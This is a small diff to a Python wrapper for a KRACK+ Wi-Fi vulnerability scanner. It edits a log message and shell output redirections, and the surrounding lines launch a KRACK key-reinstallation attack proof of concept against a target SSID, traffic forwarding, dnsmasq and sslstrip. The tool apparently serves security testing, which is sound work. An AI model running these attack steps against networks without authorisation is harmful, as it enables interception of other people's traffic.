@@ -96,7 +96,7 @@ def main():
             subprocess.call(["./prepareClientScan.sh"])
             log.info("Running KRACK+ Scan:")
             log.warn("Connect to '" + options.ssid + "' with '" + options.password + "' to scan devices.")
-            log.warn("Wait for the scan to finish or press 'ctrl-c' to end/abort scan and generate PDF of current findings.")
+            log.warn("Wait for the scan to finish (1.5 minutes after last connected device) or press 'ctrl-c' to end/abort scan and generate PDF of current findings.")
       	    with open('./scanOutput.txt', 'w') as scanOutput:
                 if options.scan and options.debug:
                     subprocess.call(["./findVulnerable/krackattack/krack-test-client.py"], shell=True)
@@ -197,9 +197,9 @@ def main():
                                          options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
                 
                 # Forward traffic        
-                subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh &>/dev/null &"], shell=True)
+                subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
                 # Start dnsmasq #TODO implement or remove
-                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && dnsmasq -d -C dnsmasq.conf --quiet-dhcp --quiet-dhcp6 --quiet-ra &>/dev/null &"], shell=True)
+                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && dnsmasq -d -C dnsmasq.conf --quiet-dhcp --quiet-dhcp6 --quiet-ra > /dev/null &"], shell=True)
 
                         
                 log.info("Open Wireshark to see traffic")
@@ -221,7 +221,7 @@ def main():
                 subprocess.call(["./killProcesses.sh sslstrip"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
             # stop forwarding traffic
-            subprocess.call(["sysctl net.ipv4.ip_forward=0 &>/dev/null"], shell=True) 
+            subprocess.call(["sysctl net.ipv4.ip_forward=0 > /dev/null"], shell=True) 
             # move packet captures to the correct folder
             if options.pcap:
                 log.info("Moving packet capture file to reports/")
@@ -236,7 +236,7 @@ def main():
             # kills dnsmasq and sslstrip (if user used the sslstrip option)
             subprocess.call(["./killProcesses.sh dnsmasq"], shell=True)
             # stop forwarding traffic
-            subprocess.call(["sysctl net.ipv4.ip_forward=0 &>/dev/null"], shell=True) 
+            subprocess.call(["sysctl net.ipv4.ip_forward=0 > /dev/null"], shell=True) 
             # kills sslstrip provided that the user chose to enable it 
             if options.sslstrip:
                 subprocess.call(["./killProcesses.sh sslstrip"], shell=True)
